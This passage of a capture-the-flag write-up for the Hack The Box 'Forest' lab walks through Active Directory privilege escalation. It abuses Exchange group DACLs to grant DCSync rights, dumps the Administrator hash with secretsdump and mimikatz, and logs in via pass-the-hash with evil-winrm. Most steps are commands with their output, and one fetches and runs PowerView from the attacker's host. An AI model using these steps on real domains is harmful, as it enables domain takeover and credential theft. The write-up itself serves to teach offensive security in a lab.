+Therefore, an attacker who controls a user account belonging to that group could grant itself *FullControl* or *DCSync-related rights* over the domain, compromising it entirely
+
+This *privesc vector* can easily be extracted from *Bloodhound*
+
+For that purpose, according to ***[these instructions](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#install-bloodhound-ce)***, proceed as follows
+
+```bash
+mkdir Bloodhound
+```
+
+```bash
+cd !$ wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
+```
+
+```bash
+tar -xvzf bloodhound-cli-linux-amd64.tar.gz && ./bloodhound-cli install
+```
+
+After this, all the necessary *bloodhound-related docker containers* are deployed and ready to be used
+
+```bash
+docker ps --all
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> CONTAINER ID   IMAGE                          COMMAND                  CREATED              STATUS                        PORTS                                                          NAMES
+> ca5dcff7222c   specterops/bloodhound:latest   "/bloodhound -config…"   About a minute ago   Up 55 seconds                 127.0.0.1:8080->8080/tcp                                       bloodhound-bloodhound-1
+> c9ddb9fe4323   postgres:16                    "docker-entrypoint.s…"   About a minute ago   Up About a minute (healthy)   5432/tcp                                                       bloodhound-app-db-1
+> f5caec4e5ccf   neo4j:4.4                      "tini -g -- /startup…"   About a minute ago   Up About a minute (healthy)   127.0.0.1:7474->7474/tcp, 7473/tcp, 127.0.0.1:7687->7687/tcp   bloodhound-graph-db-1
+> ```
+>
+
+As is already known, the *Bloodhound* framework needs certain data to be ingested in order to start building relationships between *domain objects* and so on
+
+So first, it is necessary to run either ***[Sharphound](https://github.com/SpecterOps/SharpHound)*** from the target or ***[Bloodhound.py](https://github.com/dirkjanm/BloodHound.py)*** remotely
+
+This time, we will try the second option
+
+As we have deployed ***Bloodhound CE***, it is necessary to change to the ***Bloodhound CE*** branch after cloning ***Bloodhound.py*** repository
+
+```bash
+git clone https://github.com/dirkjanm/BloodHound.py Bloodhound_py
+```
+
+```bash
+cd !$ git checkout bloodhound-ce
+python3 -m venv .venv
+```
+
+```bash
+. !$/bin/activate && pip3 install .
+```
+
+After above setup, extract all data as follows
+
+```bash
+python3 bloodhound.py --collectionmethod All --domain 'htb.local' --username 'svc-alfresco' --password 's3rvice' --nameserver 10.129.95.210 --domain-controller forest.htb.local --zip
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> INFO: BloodHound.py for BloodHound Community Edition
+> INFO: Found AD domain: htb.local
+> INFO: Getting TGT for user
+> INFO: Connecting to LDAP server: forest.htb.local
+> INFO: Testing resolved hostname connectivity dead:beef::27
+> INFO: Trying LDAP connection to dead:beef::27
+> INFO: Testing resolved hostname connectivity dead:beef::5c08:2bfc:dbfd:a769
+> INFO: Trying LDAP connection to dead:beef::5c08:2bfc:dbfd:a769
+> WARNING: Kerberos auth to LDAP failed, trying NTLM
+> INFO: Found 1 domains
+> INFO: Found 1 domains in the forest
+> INFO: Found 2 computers
+> INFO: Connecting to LDAP server: forest.htb.local
+> INFO: Testing resolved hostname connectivity dead:beef::27
+> INFO: Trying LDAP connection to dead:beef::27
+> INFO: Testing resolved hostname connectivity dead:beef::5c08:2bfc:dbfd:a769
+> INFO: Trying LDAP connection to dead:beef::5c08:2bfc:dbfd:a769
+> WARNING: Kerberos auth to LDAP failed, trying NTLM
+> INFO: Found 32 users
+> INFO: Found 76 groups
+> INFO: Found 2 gpos
+> INFO: Found 15 ous
+> INFO: Found 20 containers
+> INFO: Found 0 trusts
+> INFO: Starting computer enumeration with 10 workers
+> INFO: Querying computer: EXCH01.htb.local
+> INFO: Querying computer: FOREST.htb.local
+> INFO: Done in 00M 21S
+> INFO: Compressing output into 20250925193402_bloodhound.zip
+> ```
+>
+
+Then, just upload the created *zip* file to *Bloodhound CE*
+
+![[FOREST-20250925194038581.webp|200]]
+
+> ***Zoom in***
+
+Once there, mark the *SVC-Alfresco* user account as owned and run a *Saved Query* such as *Shortest path to Domain Admin*
+
+![[FOREST-20250925205442522.webp|450]]
+
+> ***Zoom in***
+
+The workflow here would be →
+
+***SVC-Alfresco (User) → Service Accounts (Group) → Privileged IT Accounts (Group) → Account Operators (Group) → Exchange Windows Permissions (Group) → HTB.local (Domain)***
+
+---
+
+#### *Privesc*
+
+***Initial Non-Privileged User → svc-alfresco***
+
+##### *DCSync via DACL Abuse leveraging Nested Group Membership (Exchange Groups)*
+
+###### *From Linux*
+
+> ***From the attacker*** ⚔️
+
+As mentioned, *SVC-Alfresco* user is member of the *Account Operators domain-builtin group*. Therefore, we authenticate as this user to the domain in order to create a new user account
+
+This time we have the domain account password, so we can use the ***Samba Suite [Net](https://www.samba.org/samba/docs/current/man-html/net.8.html) Tool***. However, if an attacker only has its *NT hash*, the following task can be accomplished using ***[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)***
+
+```bash
+net rpc user add '4l3xbb' '4l3xbb' -U 'htb.local/svc-alfresco%s3rvice' -S 'forest.htb.local'
+```
+
+Next, we need to add the created user account to the *Exchange Windows Permissions* group in order to have *WriteDACL* rights over the *Domain Object* i.e. *htb.local*
+
+```bash
+net rpc group addmem "Exchange Windows Permissions" "4l3xbb" -U 'htb.local/svc-alfresco%s3rvice' -S 'forest.htb.local'
+```
+
+The membership of the user account on the above *Exchange group* can be as follows
+
+```bash
+net rpc group members 'Exchange Windows Permissions' -U 'htb.local/svc-alfresco%s3rvice' -S 'forest.htb.local'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> HTB\Exchange Trusted Subsystem
+> HTB\4l3xbb
+> ```
+>
+
+After that, we perform *DACL Abuse* by granting ourselves with *DCSync* rights over the *domain object*
+
+> ***[DACLEdit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py)***
+
+```bash
+dacledit.py -dc-ip 'forest.htb.local' -principal '4l3xbb' -target-dn 'dc=htb,dc=local' -action write -rights 'DCSync' 'htb.local/4l3xbb:password123$!'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+>[*] DACL backed up to dacledit-20250927-205159.bak
+>[*] DACL modified successfully!
+> ```
+>
+
+We check that *DS-Replication-Get-Changes* and *DS-Replication-Get-Changes-All* rights exist for the created user account over *htb.local*
+
+```bash
+dacledit.py -dc-ip 'forest.htb.local' -principal '4l3xbb' -target-dn 'dc=htb,dc=local' -action read 'htb.local/svc-alfresco:s3rvice'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [*] Parsing DACL
+> [*] Printing parsed DACL
+> [*] Filtering results for SID (S-1-5-21-3072663084-364016917-1341370565-10102)
+> [*]   ACE[6] info                
+> [*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+> [*]     ACE flags                 : None
+> [*]     Access mask               : ControlAccess
+> [*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+> [*]     Object type (GUID)        : DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+> [*]     Trustee (SID)             : 4l3xbb (S-1-5-21-3072663084-364016917-1341370565-10102)
+> [*]   ACE[10] info                
+> [*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+> [*]     ACE flags                 : None
+> [*]     Access mask               : ControlAccess
+> [*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+> [*]     Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+> [*]     Trustee (SID)             : 4l3xbb (S-1-5-21-3072663084-364016917-1341370565-10102)
+> ```
+>
+
+With all the above tasks carried out, it only remains to perform the *DCSync attack* using ***Impacket's [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***
+
+```bash
+secretsdump.py -just-dc-user 'Administrator' 'htb.local/4l3xbb:password123$!@forest.htb.local'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+> 
+> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+> [*] Using the DRSUAPI method to get NTDS.DIT secrets
+> htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+> [*] Kerberos keys grabbed
+> htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+> htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+> htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+> [*] Cleaning up... 
+> ```
+>
+
+Once the above attack is performed, it is recommended to carry out a *DACL cleanup* by removing the *DCSync rights* assigned to the created user account
+
+```bash
+dacledit.py -dc-ip 'forest.htb.local' -principal '4l3xbb' -target-dn 'dc=htb,dc=local' -action remove -rights 'DCSync' 'htb.local/4l3xbb:password1234$!'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [*] DACL backed up to dacledit-20250928-154712.bak
+> [*] DACL modified successfully!
+> ```
+>
+
+And that's all, use the above *NT Hash* or *AES Keys* to perform *[[PASS THE HASH|PtH]]* or *[[PASS THE KEY|PtK]]* and establish a remote connection to the *DC* as the *Administrator user* through *WinRM*
+
+```bash
+evil-winrm --ip 'forest.htb.local' --user 'Administrator' --hash '32693b11e6aa90eb43d32c72a07ceea6'
+PS > whoami
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Evil-WinRM shell v3.5
+>                                         
+> Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+>                                         
+> Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+>                                         
+> Info: Establishing connection to remote endpoint
+> *Evil-WinRM* PS C:\Users\Administrator\Documents> 
+> *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+> htb\administrator
+> *Evil-WinRM* PS C:\Users\Administrator\Documents> 
+> ```
+>
+
+###### *From Windows*
+
+> ***From the target*** 🎯
+
+The steps to be taken are the same as *[[#From Linux|here]]*
+
+Due to *OPSEC* reasons, we will create the user account and add it to the *Exchange Windows Permissions* group using ***[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)*** instead of the *net.exe utility* from *Windows*
+
+In order to use all functionality provided by *Powerview* on the target, just establish a remote session via *WinRM* as *SVC-Alfresco* to the target and download the script from there
+
+```bash
+evil-winrm --ip 'forest.htb.local' --user 'svc-alfresco' --password 's3rvice'
+```
+
+- ***From the Attacker***  ⚔️
+
+```bash
+curl --silent --location --request GET "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1" --remote-name
+```
+
+```bash
+python3 -m http.server 80
+```
+
+- ***From the Target*** 🎯
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('http://10.10.16.37/PowerView.ps1')
+```
+
+With the above steps completed, simply create the user account and add it to the mentioned group as follows
+
+> ***User creation***
+
+```bash
+$pass = ConvertTo-SecureString -AsPlainText -Force -String 'password1234$!'
+```
+
+```bash
+New-DomainUser -SamAccountName '4l3xbb' -AccountPassword $pass
+```
+
+> ***Adding created user to Exchange Windows Permissions Group***
+
+```bash
+Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members '4l3xbb'
+```
+
+Check if the user now belongs to that group
+
+```bash
+Get-DomainGroupMember -Identity 'Exchange Windows Permissions'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> GroupDomain             : htb.local
+> GroupName               : Exchange Windows Permissions
+> GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+> MemberDomain            : htb.local
+> MemberName              : 4l3xbb
+> MemberDistinguishedName : CN=4l3xbb,CN=Users,DC=htb,DC=local
+> MemberObjectClass       : user
+> MemberSID               : S-1-5-21-3072663084-364016917-1341370565-10106
+> 
+> GroupDomain             : htb.local
+> GroupName               : Exchange Windows Permissions
+> GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+> MemberDomain            : htb.local
+> MemberName              : Exchange Trusted Subsystem
+> MemberDistinguishedName : CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+> MemberObjectClass       : group
+> MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119
+> ```
+>
+
+Next, we grant *DCSync* rights to the user account over the *domain object*
+
+First, create again a *password* object followed by a *credential* object
+
+```bash
+$pass = ConvertTo-SecureString -AsPlainText -Force -String 'password1234$!'
+```
+
+```bash
+$cred = New-Object System.Management.Automation.PSCredential('htb.local\4l3xbb', $pass)
+```
+
+Then, create the *DCSync-related ACEs* over *htb.local* for *4l3xbb UPN*
+
+```bash
+Add-DomainObjectACL -Credential $cred -PrincipalIdentity '4l3xbb' -TargetIdentity 'htb.local' -Rights DCSync
+```
+
+Validate it as follows
+
+```bash
+$sid = Get-DomainUser '4l3xbb' | Select-Object -ExpandProperty objectsid
+```
+
+```bash
+Get-DomainObjectACL 'dc=htb,dc=local' -ResolveGUIDs -ErrorAction SilentlyContinue | Where-Object { $_.SecurityIdentifier -eq $sid }
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> AceQualifier           : AccessAllowed
+> ObjectDN               : DC=htb,DC=local
+> ActiveDirectoryRights  : ExtendedRight
+> ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+> ObjectSID              : S-1-5-21-3072663084-364016917-1341370565
+> InheritanceFlags       : None
+> BinaryLength           : 56
+> AceType                : AccessAllowedObject
+> ObjectAceFlags         : ObjectAceTypePresent
+> IsCallback             : False
+> PropagationFlags       : None
+> SecurityIdentifier     : S-1-5-21-3072663084-364016917-1341370565-10106
+> AccessMask             : 256
+> AuditFlags             : None
+> IsInherited            : False
+> AceFlags               : None
+> InheritedObjectAceType : All
+> OpaqueLength           : 0
+> 
+> AceQualifier           : AccessAllowed
+> ObjectDN               : DC=htb,DC=local
+> ActiveDirectoryRights  : ExtendedRight
+> ObjectAceType          : DS-Replication-Get-Changes
+> ObjectSID              : S-1-5-21-3072663084-364016917-1341370565
+> InheritanceFlags       : None
+> BinaryLength           : 56
+> AceType                : AccessAllowedObject
+> ObjectAceFlags         : ObjectAceTypePresent
+> IsCallback             : False
+> PropagationFlags       : None
+> SecurityIdentifier     : S-1-5-21-3072663084-364016917-1341370565-10106
+> AccessMask             : 256
+> AuditFlags             : None
+> IsInherited            : False
+> AceFlags               : None
+> InheritedObjectAceType : All
+> OpaqueLength           : 0
+> 
+> AceQualifier           : AccessAllowed
+> ObjectDN               : DC=htb,DC=local
+> ActiveDirectoryRights  : ExtendedRight
+> ObjectAceType          : DS-Replication-Get-Changes-All
+> ObjectSID              : S-1-5-21-3072663084-364016917-1341370565
+> InheritanceFlags       : None
+> BinaryLength           : 56
+> AceType                : AccessAllowedObject
+> ObjectAceFlags         : ObjectAceTypePresent
+> IsCallback             : False
+> PropagationFlags       : None
+> SecurityIdentifier     : S-1-5-21-3072663084-364016917-1341370565-10106
+> AccessMask             : 256
+> AuditFlags             : None
+> IsInherited            : False
+> AceFlags               : None
+> InheritedObjectAceType : All
+> OpaqueLength           : 0
+> ```
+>
+
+From here, an actor could use *secretsdump.py* in order to dump all domain credentials remotely or upload a ***[mimikatz.exe](https://github.com/ParrotSec/mimikatz)*** binary to the *DC*to carry out the same action
+
+- ***Secretsdump.py***
+
+> ***From the Attacker***⚔️ 
+
+```bash
+secretsdump.py -just-dc-user Administrator 'htb.local/4l3xbb:password1234$!@forest.htb.local'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+> 
+> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+> [*] Using the DRSUAPI method to get NTDS.DIT secrets
+> htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+> [*] Kerberos keys grabbed
+> htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+> htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+> htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+> [*] Cleaning up... 
+> ```
+>
+
+- ***Mimikatz***
+
+> ***From the Target*** 🎯 
+
+```bash
+.\mimikatz.exe 'lsadump::dcsync /domain:htb.local /user:Administrator' exit
+```
